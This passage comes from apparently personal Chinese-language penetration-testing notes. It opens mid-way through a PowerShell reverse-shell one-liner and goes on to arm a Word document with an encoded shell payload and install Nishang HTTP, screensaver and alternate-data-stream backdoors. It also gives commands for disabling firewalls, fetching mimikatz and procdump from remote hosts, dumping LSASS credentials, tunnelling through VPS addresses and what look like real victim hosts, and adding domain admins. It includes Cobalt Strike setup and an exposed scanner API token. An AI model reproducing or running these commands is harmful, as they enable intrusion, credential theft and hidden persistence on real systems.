Net.Sockets.TCPClient(&#x27;192.168.254.1&#x27;,55555)).GetStream();[byte[]]$bt=0..65535|%&#123;0&#125;;while(($i=$sm.Read($bt,0,$bt.Length)) -ne 0)&#123;;$d=(New-Object Text.ASCIIEncoding).GetString($bt,0,$i);$st=([text.encoding]::ASCII).GetBytes((iex $d 2&gt;&amp;1));$sm.Write($st,0,$st.Length)&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">将第三行复制出来，并把地址和端口修改成vps，然后使用工具加密</span><br><span class="line">Invoke-Encode -DataToEncode &#x27;复制的修改后代码&#x27; -IsString -PostScript</span><br><span class="line">之后会生成两个文件，encoded.txt和encodedcommand.txt</span><br><span class="line"></span><br><span class="line">生成word文件</span><br><span class="line">Out-Word -PayloadScript encodedcommand.txt</span><br><span class="line"></span><br><span class="line">当用户打开文件后，就会反弹shell</span><br></pre></td></tr></table></figure>

<h2 id="后门-2"><a href="#后门-2" class="headerlink" title="后门"></a>后门</h2><p>①、HTTP-Backdoor</p>
<p>下载后，在目标机器的内存中执行。</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">HTTP<span class="literal">-Backdoor</span> <span class="literal">-CheckURL</span> http://gabgm.com/backdoor.php <span class="literal">-PayloadURL</span> http://gabgm.com/backdoor.php <span class="literal">-MagicString</span> <span class="built_in">start</span> <span class="literal">-StopString</span> stop</span><br><span class="line">CheckURL  指定URL，如果存在，MagicString中的值就会执行payload来下载运行脚本</span><br><span class="line">PayloadURL  指定powershell脚本地址</span><br><span class="line">Arguments  指定要执行的函数</span><br><span class="line">StopString 判断是否存在CheckURL返回的字符串，如果存在就停止执行</span><br></pre></td></tr></table></figure>

<p>②、Add-ScrnSaveBackdoor</p>
<p>利用windows屏保隐藏后门</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Add-ScrnSaveBackdoor</span> <span class="literal">-Payload</span> <span class="string">&quot;powershell.exe -ExecutionPolicy Bypass -noprofile -noexit -c Get-Process&quot;</span>  执行payload</span><br><span class="line"><span class="built_in">Add-ScrnSaveBackdoor</span> <span class="literal">-PayloadURL</span> http://<span class="number">192.168</span>.<span class="number">168.168</span>/nishang/Powerpreter.psm1 <span class="literal">-Arguments</span> HTTP<span class="literal">-Backdoor</span> http://gabgm.com/ http://gabgm.com/ <span class="built_in">start</span> stop  在powershell中执行一个httpbackdoor</span><br><span class="line"><span class="built_in">Add-ScrnSaveBackdoor</span> <span class="literal">-PayloadURL</span> http://<span class="number">192.168</span>.<span class="number">168.168</span>/code_exec.ps1</span><br><span class="line"></span><br><span class="line">也可以使用msf生成powershell脚本</span><br><span class="line"></span><br><span class="line">PayloadURL   指定需要下载的脚本地址</span><br><span class="line">Arguments 指定要执行的函数以及参数</span><br></pre></td></tr></table></figure>

<p>③、Execute-OnTime</p>
<p>指定Powershell脚本的执行时间，和HTTP-Backdoor使用方法相似，只是多了定时功能。</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">Execute<span class="literal">-OnTime</span> <span class="literal">-PayloadURL</span> http://<span class="number">192.168</span>.<span class="number">168.168</span>/nishang/Powerpreter.psm1 <span class="literal">-Arguments</span> <span class="built_in">Get-Information</span> <span class="literal">-Time</span> <span class="number">23</span>:<span class="number">21</span> <span class="literal">-CheckURL</span> http://gabgm.com/ http://gabgm.com/ <span class="literal">-StopString</span> stop</span><br></pre></td></tr></table></figure>

<p>④、Invoke-ADSBackdoor</p>
<p>使用NTFS数据流留下一个永久性后门，不容易被发现。该脚本向ADS注入代码，并以普通用户权限运行。</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Invoke-ADSBackdoor</span> <span class="literal">-PayloadURL</span> http://<span class="number">192.168</span>.<span class="number">168.168</span>/backdoor.ps1</span><br><span class="line">执行后，该文件在本地无法被正常查看，只能通过cmd窗口，使用<span class="built_in">dir</span> /a /<span class="built_in">r</span>才能查看</span><br></pre></td></tr></table></figure>





<h1 id="cmd命令"><a href="#cmd命令" class="headerlink" title="cmd命令"></a>cmd命令</h1><h2 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h2><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">hostname  查看本机名</span><br><span class="line">查看进程</span><br><span class="line">wmic process list brief  </span><br><span class="line">tasklist /v</span><br><span class="line">nslookup www.goole.com   //查看是否可以解析出外网服务器ip地址</span><br><span class="line">linux可以使用dig @<span class="number">8</span>.<span class="number">8</span>.<span class="number">8</span>.<span class="number">8</span> www.google.com</span><br><span class="line"></span><br><span class="line">nc -zv <span class="number">140</span>.<span class="number">112</span>.<span class="number">161</span>.<span class="number">206</span> <span class="number">80</span> 查看是否可以连接目标ip端口，测试连通性，是否可以出网</span><br><span class="line"></span><br><span class="line">ICMP隧道工具：PingTunnel、icmptunnel、Icmpsh、powershell icmp</span><br><span class="line"></span><br><span class="line">wpscan：</span><br><span class="line">wpscan --url https://thebookendsreview.com/ --api-token Rfo1vcwql9LnzgvJgXmeh9VRkikkafK2asA6cY2Iym4 --random-user-agent</span><br><span class="line"></span><br><span class="line">查看共享目录</span><br><span class="line"><span class="built_in">net</span> share </span><br><span class="line">wmic share  (get name,<span class="built_in">path</span>)</span><br><span class="line"></span><br><span class="line">wmic service list brief  查看服务</span><br><span class="line"></span><br><span class="line"><span class="built_in">ipconfig</span> /displaydns  显示dns缓存</span><br><span class="line">route <span class="built_in">print</span>  显示路由表</span><br><span class="line">arp -a   arp缓存</span><br><span class="line">whoami /all  查看用户sid</span><br><span class="line">systeminfo  查看系统信息</span><br><span class="line">netsh firewall show config  查看防火墙配置</span><br><span class="line">netsh firewall <span class="built_in">set</span> opmode disable  关闭防火墙 server2003及之前版本</span><br><span class="line">netsh advfirewall <span class="built_in">set</span> allprofiles state off  关闭防火墙 server2003之后版本</span><br><span class="line"></span><br><span class="line">reg query &quot;hkey_local_machine\system\currentcontrolset\control\terminal server\winstations\rdp-tcp&quot; /V portnumber  查看远程连接端口 （<span class="number">16</span>进制）</span><br><span class="line">netsh  advfirewall firewall add rule name=&quot;Remote Desktop&quot; protocol=TCP <span class="built_in">dir</span>=<span class="keyword">in</span> localport=<span class="number">3389</span> action=allow 放行<span class="number">3389</span>端口</span><br><span class="line">netsh  advfirewall firewall add rule name=&quot;pass&quot; <span class="built_in">dir</span>=<span class="keyword">in</span> action=allow program=&quot;C:\nc.exe&quot; 允许指定程序连入</span><br><span class="line">netsh  advfirewall firewall add rule name=&quot;pass&quot; <span class="built_in">dir</span>=out action=allow program=&quot;C:\nc.exe&quot; 允许指定程序连出</span><br><span class="line"></span><br><span class="line">wmic product get name,version,installsource  查看安装的软件和版本</span><br><span class="line"><span class="built_in">net</span> user  查看用户组</span><br><span class="line"><span class="built_in">net</span> localgroup administrators   查看本地管理员</span><br><span class="line">query user || qwinsta  查看当前在线用户</span><br><span class="line"><span class="built_in">net</span> sessions  列出本地计算机与连接的客户端的会话</span><br><span class="line">wmic qfe get caption,description,hotfixid,installedon   查看补丁情况</span><br><span class="line">wmic os get caption 查看系统名</span><br><span class="line"></span><br><span class="line">route <span class="built_in">print</span>  路由表</span><br><span class="line"><span class="built_in">type</span> a.txt 查看文件</span><br><span class="line">reg query HKEY_CURRENT_USER\Software  查看注册表</span><br><span class="line">netstat -aon    查看端口</span><br><span class="line"><span class="built_in">taskkill</span> /f /t /im ALsvc.exe 杀死Alsvc进程</span><br><span class="line">wmic startup get command,caption   查看开机启动项</span><br><span class="line"><span class="built_in">net</span> statistics workstation   查看开机时间</span><br><span class="line"><span class="built_in">del</span> a.txt  删除文件</span><br><span class="line"><span class="built_in">type</span> a.txt 查看文件</span><br><span class="line">wget.exe http://<span class="number">192</span>.<span class="number">168</span>.<span class="number">168</span>.<span class="number">168</span>/procdump.exe -O D:\apps\wget\bin\procdump.exe</span><br><span class="line">wget.exe http://<span class="number">192</span>.<span class="number">168</span>.<span class="number">168</span>.<span class="number">168</span>/Win32/mimikatz.exe -O D:\apps\wget\bin\</span><br><span class="line">exec xp_cmdshell &#x27;regsvr32 /s /u  D:\apps\wget\bin\server.dll&#x27;</span><br><span class="line">certutil -hashfile burpsuite_pro_v2021.<span class="number">4</span>.<span class="number">2</span>.jar sha256    计算文件hash</span><br><span class="line">certutil -encode ew.exe ew.txt   将exe用base64加密成文本</span><br><span class="line">certutil -decode ew.txt ew.exe 将加密后的文本还原成exe文件</span><br><span class="line"><span class="number">7</span>z.exe x nb.zip -aoa -pasd   <span class="number">7</span>z解压</span><br><span class="line">-aoa</span><br><span class="line">表示直接覆盖现有文件，且没有提示。类似的还有：</span><br><span class="line">-aos跳过现有文件不会覆盖</span><br><span class="line">-aou如果相同文件名的文件已存在，将自动重命名被释放的文件</span><br><span class="line">-aot如果相同文件名的文件已存在，将自动重命名现有的文件</span><br><span class="line"><span class="number">7</span>z.exe a nb.zip c:\nb   <span class="number">7</span>z压缩</span><br><span class="line">&quot;C:\Program Files\<span class="number">7</span>-zip\<span class="number">7</span>z.exe&quot;  x nb.zip -pasd</span><br><span class="line">certutil -encode ew.exe ew.txt   将exe用base64加密成文本</span><br><span class="line">certutil -decode ew.txt ew.exe 将加密后的文本还原成exe文件</span><br><span class="line"><span class="built_in">dir</span> /a/s 查看当前目录下的所有子目录和文件，可以用来查看文件夹大小</span><br><span class="line"><span class="built_in">dir</span> /b /s | <span class="built_in">find</span> /v /c &quot;&amp;#@&quot; 统计当前路径下的所有文件数量（包括子目录） </span><br><span class="line"><span class="built_in">dir</span> /b /s /a-d | <span class="built_in">find</span> /v /c &quot;&amp;#@&quot;  统计当前路径下的所有文件及文件夹数量（包括子目录） </span><br><span class="line"></span><br><span class="line">linux远程连接windows： rdesktop <span class="number">192</span>.<span class="number">168</span>.<span class="number">168</span>.<span class="number">168</span>:<span class="number">3389</span></span><br><span class="line"></span><br><span class="line">python3：</span><br><span class="line">python -m http.server port</span><br><span class="line"></span><br><span class="line">python2：</span><br><span class="line">python -m SimpleHTTPServer port</span><br></pre></td></tr></table></figure>

<h2 id="内网扫描"><a href="#内网扫描" class="headerlink" title="内网扫描"></a>内网扫描</h2><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">内网扫描</span><br><span class="line"><span class="keyword">for</span> /L %I <span class="keyword">in</span> (<span class="number">1</span>,<span class="number">1</span>,<span class="number">254</span>) <span class="keyword">DO</span> @<span class="built_in">ping</span> -w <span class="number">1</span> -n <span class="number">1</span> <span class="number">192</span>.<span class="number">168</span>.<span class="number">1</span>.%I | <span class="built_in">findstr</span> &quot;TTL&quot;</span><br><span class="line">nbtscan.exe <span class="number">192</span>.<span class="number">168</span>.<span class="number">1</span>.<span class="number">1</span>\<span class="number">24</span></span><br><span class="line">arp-scan.exe -t IP</span><br><span class="line">sl -h -t <span class="number">22</span>,<span class="number">80</span>-<span class="number">89</span>,<span class="number">1433</span>,<span class="number">3306</span>,<span class="number">3389</span> -u <span class="number">53</span>,<span class="number">161</span>,<span class="number">137</span>,<span class="number">139</span> -O sl.txt -p <span class="number">192</span>.<span class="number">168</span>.<span class="number">1</span>.<span class="number">1</span>-<span class="number">254</span> /b </span><br><span class="line">-t 表示tcp -u表示udp</span><br><span class="line">telnet ip port</span><br><span class="line"></span><br><span class="line">metasploit</span><br><span class="line">search portscan</span><br><span class="line">use auxiliary/scanner/portscan/tcp</span><br><span class="line"></span><br><span class="line">windows扫描内网可以使用nbtscan</span><br><span class="line">nbt.exe <span class="number">192</span>.<span class="number">168</span>.<span class="number">1</span>.<span class="number">1</span>/<span class="number">24</span></span><br><span class="line">或者使用命令行</span><br><span class="line"><span class="keyword">for</span> /L %I <span class="keyword">in</span> (<span class="number">1</span>,<span class="number">1</span>,<span class="number">254</span>) <span class="keyword">DO</span> @<span class="built_in">ping</span> -w <span class="number">1</span> -n <span class="number">1</span> <span class="number">192</span>.<span class="number">168</span>.<span class="number">1</span>.%I | <span class="built_in">findstr</span> &quot;TTL=&quot;</span><br><span class="line"></span><br><span class="line">arps扫描可以用arp-scan</span><br><span class="line">arp.exe -t <span class="number">192</span>.<span class="number">168</span>.<span class="number">1</span>.<span class="number">1</span>/<span class="number">24</span></span><br><span class="line"></span><br><span class="line">端口扫描可以使用ScanLine</span><br><span class="line">sl -h -t <span class="number">20</span>,<span class="number">80</span>-<span class="number">443</span>,<span class="number">3389</span> -u <span class="number">53</span>.<span class="number">161</span>.<span class="number">137</span>.<span class="number">139</span> -o c:\log.txt -p <span class="number">192</span>.<span class="number">168</span>.<span class="number">1</span>.<span class="number">1</span>-<span class="number">254</span> /b</span><br><span class="line"></span><br><span class="line">使用telnet</span><br><span class="line">telnet ip port</span><br><span class="line"></span><br><span class="line">内网扫描</span><br><span class="line">@<span class="built_in">echo</span> off</span><br><span class="line"><span class="keyword">FOR</span> /L <span class="variable">%%I</span> <span class="keyword">in</span> (<span class="number">1</span>,<span class="number">1</span>,<span class="number">255</span>) <span class="keyword">do</span> <span class="built_in">ping</span> <span class="number">192</span>.<span class="number">168</span>.<span class="number">118</span>.<span class="variable">%%I</span> -n <span class="number">1</span> -w <span class="number">100</span></span><br><span class="line">arp -a &gt;C:\Project\NTU\APP\<span class="number">1</span>.txt</span><br><span class="line"><span class="keyword">exit</span></span><br></pre></td></tr></table></figure>



<h2 id="3389端口"><a href="#3389端口" class="headerlink" title="3389端口"></a>3389端口</h2><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="function">C:\<span class="title">Windows</span>\<span class="title">System32</span>\<span class="title">wbem</span>\<span class="title">wmic</span></span></span><br><span class="line"><span class="function">开启3389端口  <span class="title">server2003</span></span></span><br><span class="line"><span class="function"><span class="title">wmic</span> <span class="title">path</span> <span class="title">win32_terminalservicesetting</span> <span class="title">where</span> (<span class="title">__CLASS</span> != &quot;&quot;) <span class="title">call</span> <span class="title">setallowtsconnections</span> 1    </span></span><br><span class="line"><span class="function">开启3389端口  </span></span><br><span class="line"><span class="function"><span class="title">wmic</span> /<span class="title">namespace</span>:\\<span class="title">root</span>\<span class="title">cimv2</span>\<span class="title">terminalservices</span> <span class="title">path</span> <span class="title">win32_terminalservicesetting</span> <span class="title">where</span> (<span class="title">__CLASS</span> != &quot;&quot;) <span class="title">call</span> <span class="title">setallowtsconnections</span> 1</span></span><br><span class="line"><span class="function"><span class="title">wmic</span> /<span class="title">namespace</span>:\\<span class="title">root</span>\<span class="title">cimv2</span>\<span class="title">terminalservices</span> <span class="title">path</span> <span class="title">win32_terminalservicesetting</span> <span class="title">where</span> (<span class="title">TerminalName</span>=&#x27;<span class="title">RDP</span>-<span class="title">Tcp</span>&#x27;) <span class="title">call</span> <span class="title">setallowtsconnections</span> 1    </span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">reg</span> <span class="title">add</span> &quot;<span class="title">HKLM</span>\<span class="title">SYSTEM</span>\<span class="title">CurrentControlSet</span>\<span class="title">Control</span>\<span class="title">Terminal</span> <span class="title">Server</span>&quot; /<span class="title">v</span> <span class="title">fSingleSessionPerUser</span> /<span class="title">t</span> <span class="title">REG_DWORD</span> /<span class="title">d</span> 0 /<span class="title">f</span></span></span><br><span class="line"><span class="function"><span class="title">net</span> <span class="title">start</span> <span class="title">TermService</span></span></span><br></pre></td></tr></table></figure>

<p>8530端口用于域内机器更新软件</p>
<h2 id="下载文件"><a href="#下载文件" class="headerlink" title="下载文件"></a>下载文件</h2><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">server2003以上： certutil -urlcache -split -f http://<span class="number">192</span>.<span class="number">168</span>.<span class="number">168</span>.<span class="number">168</span>/procdump.exe  使用后需要删除缓存</span><br><span class="line">certutil -urlcache -split -f http://<span class="number">192</span>.<span class="number">168</span>.<span class="number">168</span>.<span class="number">168</span>/procdump.exe delete</span><br><span class="line">win7以上： bitsadmin /transfer myDownLoadJob /download /priority normal &quot;http://<span class="number">192</span>.<span class="number">168</span>.<span class="number">203</span>.<span class="number">140</span>/b.ps1&quot; &quot;E:\\phpstudy_pro\\WWW\\b.ps1&quot;</span><br><span class="line">win7以上： </span><br><span class="line">powershell (new-object <span class="built_in">Net</span>.WebClient).DownloadFile(&#x27;http://<span class="number">192</span>.<span class="number">168</span>.<span class="number">203</span>.<span class="number">140</span>/a.ps1&#x27;,&#x27;E:\phpstudy_pro\WWW\a.ps1&#x27;)</span><br><span class="line"></span><br><span class="line">powershell (new-object <span class="built_in">Net</span>.WebClient).DownloadFile(&#x27;http://<span class="number">43</span>.<span class="number">128</span>.<span class="number">29</span>.</span><br><span class="line"><span class="number">128</span>/procdump.exe&#x27;,&#x27;c:\procdump.exe&#x27;)</span><br></pre></td></tr></table></figure>

<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="function">ftp:</span></span><br><span class="line"><span class="function"><span class="title">ftp</span> 192.168.168.168</span></span><br><span class="line"><span class="function">输入用户名和密码就连接成功</span></span><br><span class="line"><span class="function"><span class="title">type</span> 查看当前传输方式，默认是<span class="title">ascii</span>码模式（传输<span class="title">txt</span>等文件），<span class="title">binary</span>为二进制传输（传输<span class="title">exe</span>，图片，视频等）。</span></span><br><span class="line"><span class="function"><span class="title">lcd</span> 查看本地当前位置</span></span><br><span class="line"><span class="function"><span class="title">cd</span> 进入指定目录</span></span><br><span class="line"><span class="function"><span class="title">get</span> <span class="title">test.txt</span> 下载<span class="title">ftp</span>服务器上的<span class="title">test.txt</span>文件到本地当前位置</span></span><br><span class="line"><span class="function"><span class="title">put</span> <span class="title">test.txt</span> 1.<span class="title">txt</span> 上传<span class="title">test.txt</span>文件,并命名为1.<span class="title">txt</span>，1.<span class="title">txt</span>省略则表示不改文件名</span></span><br><span class="line"><span class="function"><span class="title">send</span> <span class="title">test.txt</span> 1.<span class="title">txt</span> 上传<span class="title">test.txt</span>文件,并命名为1.<span class="title">txt</span>，1.<span class="title">txt</span>省略则表示不改文件名</span></span><br><span class="line"><span class="function"><span class="title">mget</span> <span class="title">test.txt</span> <span class="title">test1.txt</span> 下载多个文件，</span></span><br><span class="line"><span class="function"><span class="title">mget</span> .<span class="title">txt</span> 下载<span class="title">ftp</span>当前目录所有<span class="title">mp3</span>文件，其支持空格和？作为通配符</span></span><br></pre></td></tr></table></figure>

<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">vbs上传</span><br><span class="line"><span class="built_in">echo</span> ^<span class="built_in">set</span> a=createobject(^&quot;adod^&quot;+^&quot;b.stream^&quot;):<span class="built_in">set</span> w=createobject(^&quot;micro^&quot;+^&quot;soft.xmlhttp^&quot;):w.open^&quot;get^&quot;,wsh.arguments(<span class="number">0</span>),<span class="number">0</span>:w.send:a.<span class="built_in">type</span>=<span class="number">1</span>:a.open:a.write w.responsebody:a.savetofile wsh.arguments(<span class="number">1</span>),<span class="number">2</span>^  &gt;&gt; downfile.vbs</span><br><span class="line"></span><br><span class="line">使用：cscript downfile.vbs http://<span class="number">192</span>.<span class="number">168</span>.<span class="number">168</span>.<span class="number">168</span>/tv-dumper.exe tv-dumper.exe</span><br><span class="line"></span><br><span class="line">downfile.vbs内容为：</span><br><span class="line"><span class="built_in">set</span> a=createobject(&quot;adod&quot;+&quot;b.stream&quot;):<span class="built_in">set</span> w=createobject(&quot;micro&quot;+&quot;soft.xmlhttp&quot;):w.open&quot;get&quot;,wsh.arguments(<span class="number">0</span>),<span class="number">0</span>:w.send:a.<span class="built_in">type</span>=<span class="number">1</span>:a.open:a.write w.responsebody:a.savetofile wsh.arguments(<span class="number">1</span>),<span class="number">2</span>  </span><br><span class="line"></span><br><span class="line">或将链接写在vbs文件中：</span><br><span class="line"><span class="built_in">Set</span> Post = CreateObject(&quot;Msxm12.XMLHTTP&quot;)</span><br><span class="line"><span class="built_in">Set</span> Shell = CreateObject(&quot;Wscript.Shell&quot;)</span><br><span class="line">Post.Open &quot;GET&quot;.&quot;http://<span class="number">192</span>.<span class="number">168</span>.<span class="number">168</span>.<span class="number">168</span>/procdump.exe&quot;,<span class="number">0</span></span><br><span class="line">Post.Send()</span><br><span class="line"><span class="built_in">Set</span> aGet = CreateObject(&quot;ADODB.Stream&quot;)</span><br><span class="line">aGet.<span class="built_in">Mode</span> = <span class="number">3</span></span><br><span class="line">aGet.<span class="built_in">Type</span> = <span class="number">1</span></span><br><span class="line">aGet.Open()</span><br><span class="line">aGet.Write(Post.responseBody)</span><br><span class="line">aGet.SaveToFile &quot;C:\procdump.exe&quot;,<span class="number">2</span></span><br><span class="line"></span><br><span class="line">执行 cscript download.vbs</span><br></pre></td></tr></table></figure>

<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">bitsadmin</span><br><span class="line">windows xp以后的系统自带该工具</span><br><span class="line">bitsadmin /transfer n http://<span class="number">192</span>.<span class="number">168</span>.<span class="number">168</span>.<span class="number">168</span>/procdump.exe c:\procdump.exe</span><br></pre></td></tr></table></figure>

<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">certutil -encode ew.exe ew.txt   将exe用base64加密成文本</span><br><span class="line">certutil -decode ew.txt ew.exe 将加密后的文本还原成exe文件</span><br></pre></td></tr></table></figure>



<h2 id="猕猴桃抓密码"><a href="#猕猴桃抓密码" class="headerlink" title="猕猴桃抓密码"></a>猕猴桃抓密码</h2><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">procdump.exe -accepteula -ma lsass.exe lsass.dmp</span><br><span class="line">mimikatz.exe &quot;sekurlsa::minidump lsass.dmp&quot; &quot;sekurlsa::logonPasswords full&quot; &quot;<span class="keyword">exit</span>&quot; &gt;lsass.txt</span><br></pre></td></tr></table></figure>



<h2 id="端口转发"><a href="#端口转发" class="headerlink" title="端口转发"></a>端口转发</h2><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="function">https://<span class="title">github.com</span>/<span class="title">cw1997</span>/<span class="title">NATBypass</span>    //<span class="title">lcx</span>在<span class="title">golang</span>下的实现</span></span><br><span class="line"><span class="function"><span class="title">lcx.exe</span> -<span class="title">tran</span> 53 192.168.222.137 3389    正向连接   将192.168.222.137的3389端口流量转到肉鸡的53端口</span></span><br><span class="line"><span class="function"><span class="title">nb.exe</span> -<span class="title">slave</span> 185.207.154.241:54326 10.161.86.222:3389</span></span><br><span class="line"><span class="function"><span class="title">nb.exe</span> -<span class="title">slave</span> 185.207.154.241:54326 140.112.161.170:3389</span></span><br><span class="line"><span class="function"><span class="title">nb.exe</span> -<span class="title">slave</span> 104.160.41.30:54326 10.161.86.222:3389</span></span><br><span class="line"><span class="function"><span class="title">nb.exe</span> -<span class="title">slave</span> 192.168.168.168:3306 140.112.161.26:3389</span></span><br><span class="line"><span class="function"><span class="title">nb.exe</span> -<span class="title">slave</span> <span class="title">VPS</span>:54326 目标内网主机<span class="title">ip</span>:3389      //目标的边界服务器执行</span></span><br><span class="line"><span class="function"><span class="title">nb.exe</span> -<span class="title">listen</span> 54326 9999    //<span class="title">vps</span>主机执行</span></span><br><span class="line"><span class="function">./<span class="title">nb</span> -<span class="title">slave</span> 104.160.41.30:3306 140.112.36.156:33389</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">vps</span> :  <span class="title">ew_linux_x64</span> -<span class="title">s</span> <span class="title">rcsocks</span> -<span class="title">l</span> 3389 -<span class="title">e</span> 54326</span></span><br><span class="line"><span class="function">目标机：<span class="title">ew.exe</span> -<span class="title">s</span> <span class="title">rssocks</span> -<span class="title">d</span> 104.160.41.30 -<span class="title">e</span> 54326</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">python</span> <span class="title">neoreg.py</span> -<span class="title">p</span> 54326 -<span class="title">u</span> <span class="title">http</span>://<span class="title">www.panshin.com.tw</span>/<span class="title">panshin</span>/<span class="title">css</span>/<span class="title">tunnel.php</span> -<span class="title">k</span> <span class="title">password</span></span></span><br></pre></td></tr></table></figure>



<h2 id="域"><a href="#域" class="headerlink" title="域"></a>域</h2><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">whoami /all  查看用户sid</span><br><span class="line"><span class="built_in">net</span> view /domain  查询所有域名</span><br><span class="line"><span class="built_in">net</span> view /domain:acaif    查询acaif域内所有计算机</span><br><span class="line"><span class="built_in">net</span> group /domain   查询域内所有用户组列表  </span><br><span class="line">	常见用户组有：</span><br><span class="line">	Domain Admins   域管理员组</span><br><span class="line">	Domain Computers  域内机器</span><br><span class="line">	Domain Controllers  域控制器</span><br><span class="line">	Domain Guest  域访客组  权限低</span><br><span class="line">	Domain Users   域用户</span><br><span class="line">	Enterprise Admins  企业系统管理员用户</span><br><span class="line">	Domain Admins和Enterprise Admins组对域有完全控制权</span><br><span class="line"><span class="built_in">net</span> group &quot;domain computers&quot; /domain  查询所有域成员计算机列表</span><br><span class="line"><span class="built_in">net</span> accounts /domain 获取域内密码设置信息</span><br><span class="line">nltest /domain_trusts   获取域信任信息</span><br><span class="line">nltest /DCLIST:acaif     查看acaif域内域控制器机器名</span><br><span class="line">netdom query pdc   查询域控制器的机器名</span><br><span class="line">nslookup -<span class="built_in">type</span>=SRV _ldap._tcp   查看域控制器的主机名</span><br><span class="line"><span class="built_in">net</span> <span class="built_in">time</span> /domain  查询时间服务器上的时间，时间服务器一般为主控制器</span><br><span class="line"><span class="built_in">net</span> group &quot;Domain Controllers&quot; /domain  查看域控制器组用户</span><br><span class="line"><span class="built_in">net</span> group &quot;domain computers&quot; /doamin    查询所有域成员计算机列表</span><br><span class="line"><span class="built_in">net</span> user /domain  查询域内所有用户列表      krbtgt用户用来创建票据授予服务TGS加密的密钥</span><br><span class="line"><span class="built_in">net</span> user administrator /domain 查看指定账户详细信息</span><br><span class="line">wmic useraccount get /all     获取域内用户的详细信息</span><br><span class="line">dsquery user  查看存在的用户     dsquery工具查询域内信息很有用，有空学习</span><br><span class="line">dsquery server   查看域内的AD DC/LDS实例</span><br><span class="line"><span class="built_in">net</span> localgroup administrators /domain     查询域内内置的本地管理员组用户</span><br><span class="line"><span class="built_in">net</span> group &quot;Domain Admins&quot; /domain  查看域管理员组用户</span><br><span class="line"><span class="built_in">net</span> group &quot;Enterprise Admins&quot; /domain  查看管理员组用户</span><br><span class="line"><span class="built_in">net</span> group &quot;domain admins&quot; shuteer /ad /domain  添加域用户shuteer到域管理员组</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="执行hta文件"><a href="#执行hta文件" class="headerlink" title="执行hta文件"></a>执行hta文件</h2><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">rundll32.exe url.dll,OpenURL &quot;C:/Program Files/uvnc bvba/UltraVNC/VNC.hta&quot;</span><br></pre></td></tr></table></figure>



<h2 id="CS"><a href="#CS" class="headerlink" title="CS"></a>CS</h2><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">linux后台启动：</span><br><span class="line">nohup ./teamserver <span class="number">104</span>.<span class="number">160</span>.<span class="number">41</span>.<span class="number">30</span> password  &gt; log.out <span class="number">2</span>&gt;&amp;<span class="number">1</span> &amp;</span><br><span class="line"></span><br><span class="line">windows</span><br><span class="line">TeamServer.exe <span class="number">185</span>.<span class="number">207</span>.<span class="number">154</span>.<span class="number">241</span> password</span><br></pre></td></tr></table></figure>

<h1 id="powershell"><a href="#powershell" class="headerlink" title="powershell"></a>powershell</h1><h2 id="基本命令"><a href="#基本命令" class="headerlink" title="基本命令"></a>基本命令</h2><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">get-host</span> 或 <span class="variable">$PSVersionTable</span>.PSVERSION 查看powershell版本,若在cmd中执行前面加上powershell即可</span><br><span class="line"><span class="built_in">get-ExecutionPolicy</span>  查看<span class="built_in">ps</span>执行策略</span><br><span class="line">	Restricted 为脚本不能执行（默认设置）</span><br><span class="line">	RemoteSigned  本地创建的脚本可以执行，远程脚本不可以执行，带证书的除外</span><br><span class="line">	AllSigned  当脚本由受信任的发布者签名时才能运行</span><br><span class="line">	Unrestricted  允许所有脚本执行</span><br><span class="line"><span class="built_in">set-executionpolicy</span> Unrestricted  设置<span class="built_in">ps</span>脚本执行策略为Unrestricted</span><br><span class="line">在<span class="built_in">ps</span>中输入脚本绝对路径即可执行，同一目录时加上.\即可</span><br><span class="line"><span class="built_in">get-process</span> p* | <span class="built_in">stop-process</span>  管道。查询所有p开头的正在运行中的进程，并将查询到的进程作为参数，执行停止进程命令</span><br><span class="line"></span><br><span class="line"><span class="built_in">new-item</span> test.txt 创建文件</span><br><span class="line"><span class="built_in">new-item</span> <span class="literal">-itemtype</span> file test.txt 创建文件</span><br><span class="line"><span class="built_in">remove-item</span> test.txt 删除文件或目录   <span class="built_in">rm</span>也可以</span><br><span class="line"><span class="built_in">get-content</span> test.txt 读取文件内容</span><br><span class="line"><span class="built_in">set-content</span> test.txt test  设置文件内容为test</span><br><span class="line"><span class="built_in">add-content</span> test.txt test2  给文件换行追加test2</span><br><span class="line"><span class="built_in">clear-content</span> test.txt 清除文件内容</span><br><span class="line"><span class="built_in">new-item</span> <span class="literal">-itemtype</span> directory test  创建test目录  <span class="built_in">md</span>或者mkdir也可以创建目录</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>web书：</p>
